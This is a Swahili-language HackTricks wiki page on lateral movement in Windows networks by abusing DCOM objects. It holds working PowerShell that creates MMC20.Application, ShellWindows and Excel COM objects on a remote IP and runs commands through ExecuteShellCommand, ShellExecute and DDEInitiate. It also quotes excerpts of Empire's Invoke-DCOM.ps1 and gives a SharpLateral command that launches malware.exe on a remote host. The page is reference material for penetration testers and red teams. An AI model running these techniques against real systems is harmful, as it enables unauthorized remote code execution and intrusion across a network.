# DCOM Exec

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pata mianya inayojali zaidi ili uweze kuzirekebisha haraka. Intruder inafuatilia eneo lako la shambulio, inafanya uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**Kwa habari zaidi kuhusu mbinu hii, angalia chapisho halisi kutoka [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Vifaa vya Distributed Component Object Model (DCOM) vina uwezo wa kuvutia kwa mwingiliano wa mtandao na vitu. Microsoft inatoa nyaraka kamili kwa DCOM na Component Object Model (COM), zinazopatikana [hapa kwa DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) na [hapa kwa COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Orodha ya programu za DCOM inaweza kupatikana kwa kutumia amri ya PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Kitu COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), inawezesha uendeshaji wa operesheni za MMC snap-in kupitia scripti. Kwa umuhimu, kifaa hiki kina `ExecuteShellCommand` njia chini ya `Document.ActiveView`. Maelezo zaidi kuhusu njia hii yanaweza kupatikana [hapa](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Angalia ikifanya kazi:

Kipengele hiki kinawezesha utekelezaji wa amri kupitia mtandao kupitia programu ya DCOM. Kwa kuingiliana na DCOM kwa mbali kama msimamizi, PowerShell inaweza kutumika kama ifuatavyo:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Amri hii inaunganisha kwenye programu ya DCOM na inarudisha kipengele cha COM. Njia ya ExecuteShellCommand inaweza kisha kuitwa ili kutekeleza mchakato kwenye mwenyeji wa mbali. Mchakato hujumuisha hatua zifuatazo:

Angalia njia:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Pata RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Kwa habari zaidi kuhusu mbinu hii angalia chapisho asili [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Imebainika kuwa kitu cha **MMC20.Application** hakina "LaunchPermissions" wazi, na badala yake inatumia ruhusa ambazo zinaruhusu waendeshaji wa mfumo. Kwa maelezo zaidi, unaweza kuchunguza mjadala [hapa](https://twitter.com/tiraniddo/status/817532039771525120), na matumizi ya OleView .NET ya [@tiraniddo](https://twitter.com/tiraniddo) kwa kuchuja vitu bila Ruhusa ya Uzinduzi wazi inapendekezwa.

Vitu viwili maalum, `ShellBrowserWindow` na `ShellWindows`, vimebainishwa kutokana na ukosefu wao wa Ruhusa ya Uzinduzi wazi. Kutokuwepo kwa kuingia kwa usajili wa `LaunchPermission` chini ya `HKCR:\AppID\{guid}` kunamaanisha hakuna ruhusa wazi.

###  ShellWindows
Kwa `ShellWindows`, ambayo haina ProgID, njia za .NET `Type.GetTypeFromCLSID` na `Activator.CreateInstance` zinarahisisha kuunda vitu kwa kutumia AppID yake. Mchakato huu unatumia OleView .NET kupata CLSID kwa `ShellWindows`. Mara baada ya kuundwa, mwingiliano unawezekana kupitia njia ya `WindowsShell.Item`, ikiongoza kwa wito wa njia kama `Document.Application.ShellExecute`.

Amri za PowerShell za mfano zilitolewa kuunda kitu na kutekeleza amri kwa mbali:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Harakati za Upande kwa Kutumia Vitu vya DCOM vya Excel

Harakati za upande zinaweza kufanikishwa kwa kuchexploit vitu vya DCOM vya Excel. Kwa habari za kina, ni vyema kusoma mjadala kuhusu kutumia DDE ya Excel kwa harakati za upande kupitia DCOM kwenye [blogu ya Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Mradi wa Empire unatoa scripti ya PowerShell, ambayo inaonyesha matumizi ya Excel kwa utekelezaji wa nambari kwa mbali (RCE) kwa kubadilisha vitu vya DCOM. Hapa chini ni sehemu za scripti inayopatikana kwenye [Hifadhi ya GitHub ya Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), ikionyesha njia tofauti za kutumia Excel kwa RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Zana za Kiotomatiki kwa Harakati za Upande

Zana mbili zinaonyeshwa kwa ajili ya kiotomatiki mbinu hizi:

- **Invoke-DCOM.ps1**: Hii ni script ya PowerShell iliyotolewa na mradi wa Empire ambayo inafanya iwe rahisi kuita njia tofauti za kutekeleza nambari kwenye mashine za mbali. Script hii inapatikana kwenye hazina ya GitHub ya Empire.

- **SharpLateral**: Hii ni zana iliyoundwa kwa ajili ya kutekeleza nambari kwa mbali, ambayo inaweza kutumika na amri:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Vifaa vya Kiotomatiki

* Skrini ya Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) inaruhusu kutekeleza njia zote zilizoelezwa za kuendesha nambari kwenye mashine nyingine kwa urahisi.
* Unaweza pia kutumia [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Marejeo

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Tafuta udhaifu unaofaa zaidi ili uweze kuyatatua haraka. Intruder inafuatilia eneo lako la shambulio, inatekeleza uchunguzi wa vitisho wa kujitokeza, inapata matatizo katika mfumo wako mzima wa teknolojia, kutoka kwa APIs hadi programu za wavuti na mifumo ya wingu. [**Jaribu bure**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) leo.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
